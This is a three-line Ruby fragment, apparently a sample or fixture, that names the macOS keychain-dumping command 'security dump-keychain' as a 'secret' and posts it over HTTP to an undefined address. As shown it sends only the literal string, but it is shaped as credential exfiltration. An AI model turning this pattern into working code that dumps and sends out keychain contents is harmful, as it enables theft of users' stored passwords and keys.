require "net/http"
secret = "security dump-keychain"
Net::HTTP.post(uri, secret)
